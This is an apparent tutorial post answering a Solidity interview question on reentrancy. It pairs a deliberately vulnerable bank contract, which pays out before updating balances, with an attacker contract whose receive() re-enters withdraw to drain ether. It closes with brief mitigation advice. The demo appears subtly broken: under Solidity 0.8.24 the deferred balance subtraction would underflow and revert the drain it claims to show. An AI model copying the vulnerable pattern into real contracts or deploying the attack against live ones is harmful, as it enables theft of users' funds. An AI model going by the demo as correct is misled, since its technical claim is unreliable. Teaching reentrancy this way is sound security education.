# RareSkills Solidity Interview Question #20 Answered: What is reentrancy?

This series will provide answers to the list of [Solidity interview questions](https://www.rareskills.io/post/solidity-interview-questions) that were published by [RareSkills.](https://www.rareskills.io/).

![Alt text](media/Question_20.png)

## *Question #20 (Easy): What is reentrancy?*

**Answer:** Reentrancy is a mechanism where a caller calls a function on a contract and reenters the same contract through another function call before the first function call is finished executing. This can happen when a function passes execution control to another contract via a call or Ether transfer. Then, the contract that’s granted execution control can reenter the original contract by calling one of its function.

## Demonstration:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Function to deposit Ether into the bank
    function deposit() public payable {
        require(msg.value > 0, "Deposit amount must be greater than 0");

        balances[msg.sender] += msg.value;
    }

    // Vulnerable withdraw function
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // This call is vulnerable to reentrancy
        (bool sent, ) = msg.sender.call{value: _amount}("");

        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }
}

contract AttackVulnerableBank {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    // Fallback function used to call withdraw again
    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    // Initial function to start the attack
    function attack() external payable {
        require(msg.value >= 1 ether);

        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw(1 ether);
    }

    // Withdraw Ether from this contract
    function getEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

## Further Discussion:

Reentrancy is a commonly used as an attack vector and can allow an attacker to drain a contract’s funds.

It is important to mitigate against a reentrancy attack by using a reentrancy guard. This guard can be properly following the [checks-effects-interactions pattern](https://medium.com/coinmonks/rareskills-solidity-interview-question-17-answered-what-is-the-check-effects-pattern-975e262eb616), explicitly implementing a modifier to prevent the function from being reentered before it finishes executing, etc.

Medium article: https://medium.com/coinsbench/rareskills-solidity-interview-question-20-answered-what-is-reentrancy-bc49c60dbef0